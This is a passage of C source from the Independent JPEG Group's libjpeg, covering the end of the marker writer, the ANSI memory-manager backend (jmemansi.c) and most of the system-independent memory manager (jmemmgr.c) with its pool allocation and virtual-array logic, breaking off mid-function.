	emit_dht(cinfo, i, TRUE);
    }
  }

  emit_marker(cinfo, M_EOI);
}


/*
 * Initialize the marker writer module.
 */

GLOBAL(void)
jinit_marker_writer (j_compress_ptr cinfo)
{
  my_marker_ptr marker;

  /* Create the subobject */
  marker = (my_marker_ptr)
    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				SIZEOF(my_marker_writer));
  cinfo->marker = (struct jpeg_marker_writer *) marker;
  /* Initialize method pointers */
  marker->pub.write_file_header = write_file_header;
  marker->pub.write_frame_header = write_frame_header;
  marker->pub.write_scan_header = write_scan_header;
  marker->pub.write_file_trailer = write_file_trailer;
  marker->pub.write_tables_only = write_tables_only;
  marker->pub.write_marker_header = write_marker_header;
  marker->pub.write_marker_byte = write_marker_byte;
  /* Initialize private state */
  marker->last_restart_interval = 0;
}
/*
 * jmemansi.c
 *
 * Copyright (C) 1992-1996, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file provides a simple generic implementation of the system-
 * dependent portion of the JPEG memory manager.  This implementation
 * assumes that you have the ANSI-standard library routine tmpfile().
 * Also, the problem of determining the amount of memory available
 * is shoved onto the user.
 */

#include "jmemsys.h"		/* import the system-dependent declarations */

#ifndef HAVE_STDLIB_H		/* <stdlib.h> should declare malloc(),free() */
extern void * malloc JPP((size_t size));
extern void free JPP((void *ptr));
#endif

#ifndef SEEK_SET		/* pre-ANSI systems may not define this; */
#define SEEK_SET  0		/* if not, assume 0 is correct */
#endif


/*
 * Memory allocation and freeing are controlled by the regular library
 * routines malloc() and free().
 */

GLOBAL(void *)
jpeg_get_small (j_common_ptr cinfo, size_t sizeofobject)
{
  return (void *) malloc(sizeofobject);
}

GLOBAL(void)
jpeg_free_small (j_common_ptr cinfo, void * object, size_t sizeofobject)
{
  free(object);
}


/*
 * "Large" objects are treated the same as "small" ones.
 * NB: although we include FAR keywords in the routine declarations,
 * this file won't actually work in 80x86 small/medium model; at least,
 * you probably won't be able to process useful-size images in only 64KB.
 */

GLOBAL(void FAR *)
jpeg_get_large (j_common_ptr cinfo, size_t sizeofobject)
{
  return (void FAR *) malloc(sizeofobject);
}

GLOBAL(void)
jpeg_free_large (j_common_ptr cinfo, void FAR * object, size_t sizeofobject)
{
  free(object);
}


/*
 * This routine computes the total memory space available for allocation.
 * It's impossible to do this in a portable way; our current solution is
 * to make the user tell us (with a default value set at compile time).
 * If you can actually get the available space, it's a good idea to subtract
 * a slop factor of 5% or so.
 */

#ifndef DEFAULT_MAX_MEM		/* so can override from makefile */
#define DEFAULT_MAX_MEM		1000000L /* default: one megabyte */
#endif

GLOBAL(long)
jpeg_mem_available (j_common_ptr cinfo, long min_bytes_needed,
		    long max_bytes_needed, long already_allocated)
{
  return cinfo->mem->max_memory_to_use - already_allocated;
}


/*
 * Backing store (temporary file) management.
 * Backing store objects are only used when the value returned by
 * jpeg_mem_available is less than the total space needed.  You can dispense
 * with these routines if you have plenty of virtual memory; see jmemnobs.c.
 */


METHODDEF(void)
read_backing_store (j_common_ptr cinfo, backing_store_ptr info,
		    void FAR * buffer_address,
		    long file_offset, long byte_count)
{
  if (fseek(info->temp_file, file_offset, SEEK_SET))
    ERREXIT(cinfo, JERR_TFILE_SEEK);
  if (JFREAD(info->temp_file, buffer_address, byte_count)
      != (size_t) byte_count)
    ERREXIT(cinfo, JERR_TFILE_READ);
}


METHODDEF(void)
write_backing_store (j_common_ptr cinfo, backing_store_ptr info,
		     void FAR * buffer_address,
		     long file_offset, long byte_count)
{
  if (fseek(info->temp_file, file_offset, SEEK_SET))
    ERREXIT(cinfo, JERR_TFILE_SEEK);
  if (JFWRITE(info->temp_file, buffer_address, byte_count)
      != (size_t) byte_count)
    ERREXIT(cinfo, JERR_TFILE_WRITE);
}


METHODDEF(void)
close_backing_store (j_common_ptr cinfo, backing_store_ptr info)
{
  fclose(info->temp_file);
  /* Since this implementation uses tmpfile() to create the file,
   * no explicit file deletion is needed.
   */
}


/*
 * Initial opening of a backing-store object.
 *
 * This version uses tmpfile(), which constructs a suitable file name
 * behind the scenes.  We don't have to use info->temp_name[] at all;
 * indeed, we can't even find out the actual name of the temp file.
 */

GLOBAL(void)
jpeg_open_backing_store (j_common_ptr cinfo, backing_store_ptr info,
			 long total_bytes_needed)
{
  if ((info->temp_file = tmpfile()) == NULL)
    ERREXITS(cinfo, JERR_TFILE_CREATE, "");
  info->read_backing_store = read_backing_store;
  info->write_backing_store = write_backing_store;
  info->close_backing_store = close_backing_store;
}


/*
 * These routines take care of any system-dependent initialization and
 * cleanup required.
 */

GLOBAL(long)
jpeg_mem_init (j_common_ptr cinfo)
{
  return DEFAULT_MAX_MEM;	/* default for max_memory_to_use */
}

GLOBAL(void)
jpeg_mem_term (j_common_ptr cinfo)
{
  /* no work */
}
/*
 * jmemmgr.c
 *
 * Copyright (C) 1991-1997, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains the JPEG system-independent memory management
 * routines.  This code is usable across a wide variety of machines; most
 * of the system dependencies have been isolated in a separate file.
 * The major functions provided here are:
 *   * pool-based allocation and freeing of memory;
 *   * policy decisions about how to divide available memory among the
 *     virtual arrays;
 *   * control logic for swapping virtual arrays between main memory and
 *     backing storage.
 * The separate system-dependent file provides the actual backing-storage
 * access code, and it contains the policy decision about how much total
 * main memory to use.
 * This file is system-dependent in the sense that some of its functions
 * are unnecessary in some systems.  For example, if there is enough virtual
 * memory so that backing storage will never be used, much of the virtual
 * array control logic could be removed.  (Of course, if you have that much
 * memory then you shouldn't care about a little bit of unused code...)
 */

#define JPEG_INTERNALS

#ifndef NO_GETENV
#ifndef HAVE_STDLIB_H		/* <stdlib.h> should declare getenv() */
extern char * getenv JPP((const char * name));
#endif
#endif


/*
 * Some important notes:
 *   The allocation routines provided here must never return NULL.
 *   They should exit to error_exit if unsuccessful.
 *
 *   It's not a good idea to try to merge the sarray and barray routines,
 *   even though they are textually almost the same, because samples are
 *   usually stored as bytes while coefficients are shorts or ints.  Thus,
 *   in machines where byte pointers have a different representation from
 *   word pointers, the resulting machine code could not be the same.
 */


/*
 * Many machines require storage alignment: longs must start on 4-byte
 * boundaries, doubles on 8-byte boundaries, etc.  On such machines, malloc()
 * always returns pointers that are multiples of the worst-case alignment
 * requirement, and we had better do so too.
 * There isn't any really portable way to determine the worst-case alignment
 * requirement.  This module assumes that the alignment requirement is
 * multiples of sizeof(ALIGN_TYPE).
 * By default, we define ALIGN_TYPE as double.  This is necessary on some
 * workstations (where doubles really do need 8-byte alignment) and will work
 * fine on nearly everything.  If your machine has lesser alignment needs,
 * you can save a few bytes by making ALIGN_TYPE smaller.
 * The only place I know of where this will NOT work is certain Macintosh
 * 680x0 compilers that define double as a 10-byte IEEE extended float.
 * Doing 10-byte alignment is counterproductive because longwords won't be
 * aligned well.  Put "#define ALIGN_TYPE long" in jconfig.h if you have
 * such a compiler.
 */

#ifndef ALIGN_TYPE		/* so can override from jconfig.h */
#define ALIGN_TYPE  double
#endif


/*
 * We allocate objects from "pools", where each pool is gotten with a single
 * request to jpeg_get_small() or jpeg_get_large().  There is no per-object
 * overhead within a pool, except for alignment padding.  Each pool has a
 * header with a link to the next pool of the same class.
 * Small and large pool headers are identical except that the latter's
 * link pointer must be FAR on 80x86 machines.
 * Notice that the "real" header fields are union'ed with a dummy ALIGN_TYPE
 * field.  This forces the compiler to make SIZEOF(small_pool_hdr) a multiple
 * of the alignment requirement of ALIGN_TYPE.
 */

typedef union small_pool_struct * small_pool_ptr;

typedef union small_pool_struct {
  struct {
    small_pool_ptr next;	/* next in list of pools */
    size_t bytes_used;		/* how many bytes already used within pool */
    size_t bytes_left;		/* bytes still available in this pool */
  } hdr;
  ALIGN_TYPE dummy;		/* included in union to ensure alignment */
} small_pool_hdr;

typedef union large_pool_struct FAR * large_pool_ptr;

typedef union large_pool_struct {
  struct {
    large_pool_ptr next;	/* next in list of pools */
    size_t bytes_used;		/* how many bytes already used within pool */
    size_t bytes_left;		/* bytes still available in this pool */
  } hdr;
  ALIGN_TYPE dummy;		/* included in union to ensure alignment */
} large_pool_hdr;


/*
 * Here is the full definition of a memory manager object.
 */

typedef struct {
  struct jpeg_memory_mgr pub;	/* public fields */

  /* Each pool identifier (lifetime class) names a linked list of pools. */
  small_pool_ptr small_list[JPOOL_NUMPOOLS];
  large_pool_ptr large_list[JPOOL_NUMPOOLS];

  /* Since we only have one lifetime class of virtual arrays, only one
   * linked list is necessary (for each datatype).  Note that the virtual
   * array control blocks being linked together are actually stored somewhere
   * in the small-pool list.
   */
  jvirt_sarray_ptr virt_sarray_list;
  jvirt_barray_ptr virt_barray_list;

  /* This counts total space obtained from jpeg_get_small/large */
  long total_space_allocated;

  /* alloc_sarray and alloc_barray set this value for use by virtual
   * array routines.
   */
  JDIMENSION last_rowsperchunk;	/* from most recent alloc_sarray/barray */
} my_memory_mgr;

typedef my_memory_mgr * my_mem_ptr;


/*
 * The control blocks for virtual arrays.
 * Note that these blocks are allocated in the "small" pool area.
 * System-dependent info for the associated backing store (if any) is hidden
 * inside the backing_store_info struct.
 */

struct jvirt_sarray_control {
  JSAMPARRAY mem_buffer;	/* => the in-memory buffer */
  JDIMENSION rows_in_array;	/* total virtual array height */
  JDIMENSION samplesperrow;	/* width of array (and of memory buffer) */
  JDIMENSION maxaccess;		/* max rows accessed by access_virt_sarray */
  JDIMENSION rows_in_mem;	/* height of memory buffer */
  JDIMENSION rowsperchunk;	/* allocation chunk size in mem_buffer */
  JDIMENSION cur_start_row;	/* first logical row # in the buffer */
  JDIMENSION first_undef_row;	/* row # of first uninitialized row */
  boolean pre_zero;		/* pre-zero mode requested? */
  boolean dirty;		/* do current buffer contents need written? */
  boolean b_s_open;		/* is backing-store data valid? */
  jvirt_sarray_ptr next;	/* link to next virtual sarray control block */
  backing_store_info b_s_info;	/* System-dependent control info */
};

struct jvirt_barray_control {
  JBLOCKARRAY mem_buffer;	/* => the in-memory buffer */
  JDIMENSION rows_in_array;	/* total virtual array height */
  JDIMENSION blocksperrow;	/* width of array (and of memory buffer) */
  JDIMENSION maxaccess;		/* max rows accessed by access_virt_barray */
  JDIMENSION rows_in_mem;	/* height of memory buffer */
  JDIMENSION rowsperchunk;	/* allocation chunk size in mem_buffer */
  JDIMENSION cur_start_row;	/* first logical row # in the buffer */
  JDIMENSION first_undef_row;	/* row # of first uninitialized row */
  boolean pre_zero;		/* pre-zero mode requested? */
  boolean dirty;		/* do current buffer contents need written? */
  boolean b_s_open;		/* is backing-store data valid? */
  jvirt_barray_ptr next;	/* link to next virtual barray control block */
  backing_store_info b_s_info;	/* System-dependent control info */
};


#ifdef MEM_STATS		/* optional extra stuff for statistics */

LOCAL(void)
print_mem_stats (j_common_ptr cinfo, int pool_id)
{
  my_mem_ptr mem = (my_mem_ptr) cinfo->mem;
  small_pool_ptr shdr_ptr;
  large_pool_ptr lhdr_ptr;

  /* Since this is only a debugging stub, we can cheat a little by using
   * fprintf directly rather than going through the trace message code.
   * This is helpful because message parm array can't handle longs.
   */
  fprintf(stderr, "Freeing pool %d, total space = %ld\n",
	  pool_id, mem->total_space_allocated);

  for (lhdr_ptr = mem->large_list[pool_id]; lhdr_ptr != NULL;
       lhdr_ptr = lhdr_ptr->hdr.next) {
    fprintf(stderr, "  Large chunk used %ld\n",
	    (long) lhdr_ptr->hdr.bytes_used);
  }

  for (shdr_ptr = mem->small_list[pool_id]; shdr_ptr != NULL;
       shdr_ptr = shdr_ptr->hdr.next) {
    fprintf(stderr, "  Small chunk used %ld free %ld\n",
	    (long) shdr_ptr->hdr.bytes_used,
	    (long) shdr_ptr->hdr.bytes_left);
  }
}

#endif /* MEM_STATS */


LOCAL(void)
out_of_memory (j_common_ptr cinfo, int which)
/* Report an out-of-memory error and stop execution */
/* If we compiled MEM_STATS support, report alloc requests before dying */
{
#ifdef MEM_STATS
  cinfo->err->trace_level = 2;	/* force self_destruct to report stats */
#endif
  ERREXIT1(cinfo, JERR_OUT_OF_MEMORY, which);
}


/*
 * Allocation of "small" objects.
 *
 * For these, we use pooled storage.  When a new pool must be created,
 * we try to get enough space for the current request plus a "slop" factor,
 * where the slop will be the amount of leftover space in the new pool.
 * The speed vs. space tradeoff is largely determined by the slop values.
 * A different slop value is provided for each pool class (lifetime),
 * and we also distinguish the first pool of a class from later ones.
 * NOTE: the values given work fairly well on both 16- and 32-bit-int
 * machines, but may be too small if longs are 64 bits or more.
 */

static const size_t first_pool_slop[JPOOL_NUMPOOLS] = 
{
	1600,			/* first PERMANENT pool */
	16000			/* first IMAGE pool */
};

static const size_t extra_pool_slop[JPOOL_NUMPOOLS] = 
{
	0,			/* additional PERMANENT pools */
	5000			/* additional IMAGE pools */
};

#define MIN_SLOP  50		/* greater than 0 to avoid futile looping */


METHODDEF(void *)
alloc_small (j_common_ptr cinfo, int pool_id, size_t sizeofobject)
/* Allocate a "small" object */
{
  my_mem_ptr mem = (my_mem_ptr) cinfo->mem;
  small_pool_ptr hdr_ptr, prev_hdr_ptr;
  char * data_ptr;
  size_t odd_bytes, min_request, slop;

  /* Check for unsatisfiable request (do now to ensure no overflow below) */
  if (sizeofobject > (size_t) (MAX_ALLOC_CHUNK-SIZEOF(small_pool_hdr)))
    out_of_memory(cinfo, 1);	/* request exceeds malloc's ability */

  /* Round up the requested size to a multiple of SIZEOF(ALIGN_TYPE) */
  odd_bytes = sizeofobject % SIZEOF(ALIGN_TYPE);
  if (odd_bytes > 0)
    sizeofobject += SIZEOF(ALIGN_TYPE) - odd_bytes;

  /* See if space is available in any existing pool */
  if (pool_id < 0 || pool_id >= JPOOL_NUMPOOLS)
    ERREXIT1(cinfo, JERR_BAD_POOL_ID, pool_id);	/* safety check */
  prev_hdr_ptr = NULL;
  hdr_ptr = mem->small_list[pool_id];
  while (hdr_ptr != NULL) {
    if (hdr_ptr->hdr.bytes_left >= sizeofobject)
      break;			/* found pool with enough space */
    prev_hdr_ptr = hdr_ptr;
    hdr_ptr = hdr_ptr->hdr.next;
  }

  /* Time to make a new pool? */
  if (hdr_ptr == NULL) {
    /* min_request is what we need now, slop is what will be leftover */
    min_request = sizeofobject + SIZEOF(small_pool_hdr);
    if (prev_hdr_ptr == NULL)	/* first pool in class? */
      slop = first_pool_slop[pool_id];
    else
      slop = extra_pool_slop[pool_id];
    /* Don't ask for more than MAX_ALLOC_CHUNK */
    if (slop > (size_t) (MAX_ALLOC_CHUNK-min_request))
      slop = (size_t) (MAX_ALLOC_CHUNK-min_request);
    /* Try to get space, if fail reduce slop and try again */
    for (;;) {
      hdr_ptr = (small_pool_ptr) jpeg_get_small(cinfo, min_request + slop);
      if (hdr_ptr != NULL)
	break;
      slop /= 2;
      if (slop < MIN_SLOP)	/* give up when it gets real small */
	out_of_memory(cinfo, 2); /* jpeg_get_small failed */
    }
    mem->total_space_allocated += min_request + slop;
    /* Success, initialize the new pool header and add to end of list */
    hdr_ptr->hdr.next = NULL;
    hdr_ptr->hdr.bytes_used = 0;
    hdr_ptr->hdr.bytes_left = sizeofobject + slop;
    if (prev_hdr_ptr == NULL)	/* first pool in class? */
      mem->small_list[pool_id] = hdr_ptr;
    else
      prev_hdr_ptr->hdr.next = hdr_ptr;
  }

  /* OK, allocate the object from the current pool */
  data_ptr = (char *) (hdr_ptr + 1); /* point to first data byte in pool */
  data_ptr += hdr_ptr->hdr.bytes_used; /* point to place for object */
  hdr_ptr->hdr.bytes_used += sizeofobject;
  hdr_ptr->hdr.bytes_left -= sizeofobject;

  return (void *) data_ptr;
}


/*
 * Allocation of "large" objects.
 *
 * The external semantics of these are the same as "small" objects,
 * except that FAR pointers are used on 80x86.  However the pool
 * management heuristics are quite different.  We assume that each
 * request is large enough that it may as well be passed directly to
 * jpeg_get_large; the pool management just links everything together
 * so that we can free it all on demand.
 * Note: the major use of "large" objects is in JSAMPARRAY and JBLOCKARRAY
 * structures.  The routines that create these structures (see below)
 * deliberately bunch rows together to ensure a large request size.
 */

METHODDEF(void FAR *)
alloc_large (j_common_ptr cinfo, int pool_id, size_t sizeofobject)
/* Allocate a "large" object */
{
  my_mem_ptr mem = (my_mem_ptr) cinfo->mem;
  large_pool_ptr hdr_ptr;
  size_t odd_bytes;

  /* Check for unsatisfiable request (do now to ensure no overflow below) */
  if (sizeofobject > (size_t) (MAX_ALLOC_CHUNK-SIZEOF(large_pool_hdr)))
    out_of_memory(cinfo, 3);	/* request exceeds malloc's ability */

  /* Round up the requested size to a multiple of SIZEOF(ALIGN_TYPE) */
  odd_bytes = sizeofobject % SIZEOF(ALIGN_TYPE);
  if (odd_bytes > 0)
    sizeofobject += SIZEOF(ALIGN_TYPE) - odd_bytes;

  /* Always make a new pool */
  if (pool_id < 0 || pool_id >= JPOOL_NUMPOOLS)
    ERREXIT1(cinfo, JERR_BAD_POOL_ID, pool_id);	/* safety check */

  hdr_ptr = (large_pool_ptr) jpeg_get_large(cinfo, sizeofobject +
					    SIZEOF(large_pool_hdr));
  if (hdr_ptr == NULL)
    out_of_memory(cinfo, 4);	/* jpeg_get_large failed */
  mem->total_space_allocated += sizeofobject + SIZEOF(large_pool_hdr);

  /* Success, initialize the new pool header and add to list */
  hdr_ptr->hdr.next = mem->large_list[pool_id];
  /* We maintain space counts in each pool header for statistical purposes,
   * even though they are not needed for allocation.
   */
  hdr_ptr->hdr.bytes_used = sizeofobject;
  hdr_ptr->hdr.bytes_left = 0;
  mem->large_list[pool_id] = hdr_ptr;

  return (void FAR *) (hdr_ptr + 1); /* point to first data byte in pool */
}


/*
 * Creation of 2-D sample arrays.
 * The pointers are in near heap, the samples themselves in FAR heap.
 *
 * To minimize allocation overhead and to allow I/O of large contiguous
 * blocks, we allocate the sample rows in groups of as many rows as possible
 * without exceeding MAX_ALLOC_CHUNK total bytes per allocation request.
 * NB: the virtual array control routines, later in this file, know about
 * this chunking of rows.  The rowsperchunk value is left in the mem manager
 * object so that it can be saved away if this sarray is the workspace for
 * a virtual array.
 */

METHODDEF(JSAMPARRAY)
alloc_sarray (j_common_ptr cinfo, int pool_id,
	      JDIMENSION samplesperrow, JDIMENSION numrows)
/* Allocate a 2-D sample array */
{
  my_mem_ptr mem = (my_mem_ptr) cinfo->mem;
  JSAMPARRAY result;
  JSAMPROW workspace;
  JDIMENSION rowsperchunk, currow, i;
  long ltemp;

  /* Calculate max # of rows allowed in one allocation chunk */
  ltemp = (MAX_ALLOC_CHUNK-SIZEOF(large_pool_hdr)) /
	  ((long) samplesperrow * SIZEOF(JSAMPLE));
  if (ltemp <= 0)
    ERREXIT(cinfo, JERR_WIDTH_OVERFLOW);
  if (ltemp < (long) numrows)
    rowsperchunk = (JDIMENSION) ltemp;
  else
    rowsperchunk = numrows;
  mem->last_rowsperchunk = rowsperchunk;

  /* Get space for row pointers (small object) */
  result = (JSAMPARRAY) alloc_small(cinfo, pool_id,
				    (size_t) (numrows * SIZEOF(JSAMPROW)));

  /* Get the rows themselves (large objects) */
  currow = 0;
  while (currow < numrows) {
    rowsperchunk = MIN(rowsperchunk, numrows - currow);
    workspace = (JSAMPROW) alloc_large(cinfo, pool_id,
	(size_t) ((size_t) rowsperchunk * (size_t) samplesperrow
		  * SIZEOF(JSAMPLE)));
    for (i = rowsperchunk; i > 0; i--) {
      result[currow++] = workspace;
      workspace += samplesperrow;
    }
  }

  return result;
}


/*
 * Creation of 2-D coefficient-block arrays.
 * This is essentially the same as the code for sample arrays, above.
 */

METHODDEF(JBLOCKARRAY)
alloc_barray (j_common_ptr cinfo, int pool_id,
	      JDIMENSION blocksperrow, JDIMENSION numrows)
/* Allocate a 2-D coefficient-block array */
{
  my_mem_ptr mem = (my_mem_ptr) cinfo->mem;
  JBLOCKARRAY result;
  JBLOCKROW workspace;
  JDIMENSION rowsperchunk, currow, i;
  long ltemp;

  /* Calculate max # of rows allowed in one allocation chunk */
  ltemp = (MAX_ALLOC_CHUNK-SIZEOF(large_pool_hdr)) /
	  ((long) blocksperrow * SIZEOF(JBLOCK));
  if (ltemp <= 0)
    ERREXIT(cinfo, JERR_WIDTH_OVERFLOW);
  if (ltemp < (long) numrows)
    rowsperchunk = (JDIMENSION) ltemp;
  else
    rowsperchunk = numrows;
  mem->last_rowsperchunk = rowsperchunk;

  /* Get space for row pointers (small object) */
  result = (JBLOCKARRAY) alloc_small(cinfo, pool_id,
				     (size_t) (numrows * SIZEOF(JBLOCKROW)));

  /* Get the rows themselves (large objects) */
  currow = 0;
  while (currow < numrows) {
    rowsperchunk = MIN(rowsperchunk, numrows - currow);
    workspace = (JBLOCKROW) alloc_large(cinfo, pool_id,
	(size_t) ((size_t) rowsperchunk * (size_t) blocksperrow
		  * SIZEOF(JBLOCK)));
    for (i = rowsperchunk; i > 0; i--) {
      result[currow++] = workspace;
      workspace += blocksperrow;
    }
  }

  return result;
}


/*
 * About virtual array management:
 *
 * The above "normal" array routines are only used to allocate strip buffers
 * (as wide as the image, but just a few rows high).  Full-image-sized buffers
 * are handled as "virtual" arrays.  The array is still accessed a strip at a
 * time, but the memory manager must save the whole array for repeated
 * accesses.  The intended implementation is that there is a strip buffer in
 * memory (as high as is possible given the desired memory limit), plus a
 * backing file that holds the rest of the array.
 *
 * The request_virt_array routines are told the total size of the image and
 * the maximum number of rows that will be accessed at once.  The in-memory
 * buffer must be at least as large as the maxaccess value.
 *
 * The request routines create control blocks but not the in-memory buffers.
 * That is postponed until realize_virt_arrays is called.  At that time the
 * total amount of space needed is known (approximately, anyway), so free
 * memory can be divided up fairly.
 *
 * The access_virt_array routines are responsible for making a specific strip
 * area accessible (after reading or writing the backing file, if necessary).
 * Note that the access routines are told whether the caller intends to modify
 * the accessed strip; during a read-only pass this saves having to rewrite
 * data to disk.  The access routines are also responsible for pre-zeroing
 * any newly accessed rows, if pre-zeroing was requested.
 *
 * In current usage, the access requests are usually for nonoverlapping
 * strips; that is, successive access start_row numbers differ by exactly
 * num_rows = maxaccess.  This means we can get good performance with simple
 * buffer dump/reload logic, by making the in-memory buffer be a multiple
 * of the access height; then there will never be accesses across bufferload
 * boundaries.  The code will still work with overlapping access requests,
 * but it doesn't handle bufferload overlaps very efficiently.
 */


METHODDEF(jvirt_sarray_ptr)
request_virt_sarray (j_common_ptr cinfo, int pool_id, boolean pre_zero,
		     JDIMENSION samplesperrow, JDIMENSION numrows,
		     JDIMENSION maxaccess)
/* Request a virtual 2-D sample array */
{
  my_mem_ptr mem = (my_mem_ptr) cinfo->mem;
  jvirt_sarray_ptr result;

  /* Only IMAGE-lifetime virtual arrays are currently supported */
  if (pool_id != JPOOL_IMAGE)
    ERREXIT1(cinfo, JERR_BAD_POOL_ID, pool_id);	/* safety check */

  /* get control block */
  result = (jvirt_sarray_ptr) alloc_small(cinfo, pool_id,
					  SIZEOF(struct jvirt_sarray_control));

  result->mem_buffer = NULL;	/* marks array not yet realized */
  result->rows_in_array = numrows;
  result->samplesperrow = samplesperrow;
  result->maxaccess = maxaccess;
  result->pre_zero = pre_zero;
  result->b_s_open = FALSE;	/* no associated backing-store object */
  result->next = mem->virt_sarray_list; /* add to list of virtual arrays */
  mem->virt_sarray_list = result;

  return result;
}


METHODDEF(jvirt_barray_ptr)
request_virt_barray (j_common_ptr cinfo, int pool_id, boolean pre_zero,
		     JDIMENSION blocksperrow, JDIMENSION numrows,
		     JDIMENSION maxaccess)
/* Request a virtual 2-D coefficient-block array */
{
  my_mem_ptr mem = (my_mem_ptr) cinfo->mem;
  jvirt_barray_ptr result;

  /* Only IMAGE-lifetime virtual arrays are currently supported */
  if (pool_id != JPOOL_IMAGE)
    ERREXIT1(cinfo, JERR_BAD_POOL_ID, pool_id);	/* safety check */

  /* get control block */
  result = (jvirt_barray_ptr) alloc_small(cinfo, pool_id,
					  SIZEOF(struct jvirt_barray_control));

  result->mem_buffer = NULL;	/* marks array not yet realized */
  result->rows_in_array = numrows;
  result->blocksperrow = blocksperrow;
  result->maxaccess = maxaccess;
  result->pre_zero = pre_zero;
  result->b_s_open = FALSE;	/* no associated backing-store object */
  result->next = mem->virt_barray_list; /* add to list of virtual arrays */
  mem->virt_barray_list = result;

  return result;
}


METHODDEF(void)
realize_virt_arrays (j_common_ptr cinfo)
/* Allocate the in-memory buffers for any unrealized virtual arrays */
{
  my_mem_ptr mem = (my_mem_ptr) cinfo->mem;
  long space_per_minheight, maximum_space, avail_mem;
  long minheights, max_minheights;
  jvirt_sarray_ptr sptr;
  jvirt_barray_ptr bptr;

  /* Compute the minimum space needed (maxaccess rows in each buffer)
   * and the maximum space needed (full image height in each buffer).
   * These may be of use to the system-dependent jpeg_mem_available routine.
   */
  space_per_minheight = 0;
  maximum_space = 0;
  for (sptr = mem->virt_sarray_list; sptr != NULL; sptr = sptr->next) {
    if (sptr->mem_buffer == NULL) { /* if not realized yet */
      space_per_minheight += (long) sptr->maxaccess *
			     (long) sptr->samplesperrow * SIZEOF(JSAMPLE);
      maximum_space += (long) sptr->rows_in_array *
		       (long) sptr->samplesperrow * SIZEOF(JSAMPLE);
    }
  }
  for (bptr = mem->virt_barray_list; bptr != NULL; bptr = bptr->next) {
    if (bptr->mem_buffer == NULL) { /* if not realized yet */
      space_per_minheight += (long) bptr->maxaccess *
			     (long) bptr->blocksperrow * SIZEOF(JBLOCK);
      maximum_space += (long) bptr->rows_in_array *
		       (long) bptr->blocksperrow * SIZEOF(JBLOCK);
    }
  }

  if (space_per_minheight <= 0)
    return;			/* no unrealized arrays, no work */

  /* Determine amount of memory to actually use; this is system-dependent. */
  avail_mem = jpeg_mem_available(cinfo, space_per_minheight, maximum_space,
				 mem->total_space_allocated);

  /* If the maximum space needed is available, make all the buffers full
   * height; otherwise parcel it out with the same number of minheights
   * in each buffer.
   */
  if (avail_mem >= maximum_space)
    max_minheights = 1000000000L;
  else {
    max_minheights = avail_mem / space_per_minheight;
    /* If there doesn't seem to be enough space, try to get the minimum
     * anyway.  This allows a "stub" implementation of jpeg_mem_available().
     */
    if (max_minheights <= 0)
      max_minheights = 1;
  }

  /* Allocate the in-memory buffers and initialize backing store as needed. */

  for (sptr = mem->virt_sarray_list; sptr != NULL; sptr = sptr->next) {
    if (sptr->mem_buffer == NULL) { /* if not realized yet */
      minheights = ((long) sptr->rows_in_array - 1L) / sptr->maxaccess + 1L;
      if (minheights <= max_minheights) {
	/* This buffer fits in memory */
	sptr->rows_in_mem = sptr->rows_in_array;
      } else {
	/* It doesn't fit in memory, create backing store. */
	sptr->rows_in_mem = (JDIMENSION) (max_minheights * sptr->maxaccess);
	jpeg_open_backing_store(cinfo, & sptr->b_s_info,
				(long) sptr->rows_in_array *
				(long) sptr->samplesperrow *
				(long) SIZEOF(JSAMPLE));
	sptr->b_s_open = TRUE;
      }
      sptr->mem_buffer = alloc_sarray(cinfo, JPOOL_IMAGE,
				      sptr->samplesperrow, sptr->rows_in_mem);
      sptr->rowsperchunk = mem->last_rowsperchunk;
      sptr->cur_start_row = 0;
      sptr->first_undef_row = 0;
      sptr->dirty = FALSE;
    }
  }

  for (bptr = mem->virt_barray_list; bptr != NULL; bptr = bptr->next) {
    if (bptr->mem_buffer == NULL) { /* if not realized yet */
      minheights = ((long) bptr->rows_in_array - 1L) / bptr->maxaccess + 1L;
      if (minheights <= max_minheights) {
	/* This buffer fits in memory */
	bptr->rows_in_mem = bptr->rows_in_array;
      } else {
	/* It doesn't fit in memory, create backing store. */
	bptr->rows_in_mem = (JDIMENSION) (max_minheights * bptr->maxaccess);
	jpeg_open_backing_store(cinfo, & bptr->b_s_info,
				(long) bptr->rows_in_array *
				(long) bptr->blocksperrow *
				(long) SIZEOF(JBLOCK));
	bptr->b_s_open = TRUE;
      }
      bptr->mem_buffer = alloc_barray(cinfo, JPOOL_IMAGE,
				      bptr->blocksperrow, bptr->rows_in_mem);
      bptr->rowsperchunk = mem->last_rowsperchunk;
      bptr->cur_start_row = 0;
      bptr->first_undef_row = 0;
      bptr->dirty = FALSE;
    }
  }
}


LOCAL(void)
do_sarray_io (j_common_ptr cinfo, jvirt_sarray_ptr ptr, boolean writing)
/* Do backing store read or write of a virtual sample array */
{
  long bytesperrow, file_offset, byte_count, rows, thisrow, i;

  bytesperrow = (long) ptr->samplesperrow * SIZEOF(JSAMPLE);
  file_offset = ptr->cur_start_row * bytesperrow;
  /* Loop to read or write each allocation chunk in mem_buffer */
  for (i = 0; i < (long) ptr->rows_in_mem; i += ptr->rowsperchunk) {
    /* One chunk, but check for short chunk at end of buffer */
    rows = MIN((long) ptr->rowsperchunk, (long) ptr->rows_in_mem - i);
    /* Transfer no more than is currently defined */
    thisrow = (long) ptr->cur_start_row + i;
    rows = MIN(rows, (long) ptr->first_undef_row - thisrow);
    /* Transfer no more than fits in file */
    rows = MIN(rows, (long) ptr->rows_in_array - thisrow);
    if (rows <= 0)		/* this chunk might be past end of file! */
      break;
    byte_count = rows * bytesperrow;
    if (writing)
      (*ptr->b_s_info.write_backing_store) (cinfo, & ptr->b_s_info,
					    (void FAR *) ptr->mem_buffer[i],
					    file_offset, byte_count);
    else
      (*ptr->b_s_info.read_backing_store) (cinfo, & ptr->b_s_info,
					   (void FAR *) ptr->mem_buffer[i],
					   file_offset, byte_count);
    file_offset += byte_count;
  }
}


LOCAL(void)
do_barray_io (j_common_ptr cinfo, jvirt_barray_ptr ptr, boolean writing)
/* Do backing store read or write of a virtual coefficient-block array */
{
  long bytesperrow, file_offset, byte_count, rows, thisrow, i;

  bytesperrow = (long) ptr->blocksperrow * SIZEOF(JBLOCK);
  file_offset = ptr->cur_start_row * bytesperrow;
  /* Loop to read or write each allocation chunk in mem_buffer */
  for (i = 0; i < (long) ptr->rows_in_mem; i += ptr->rowsperchunk) {
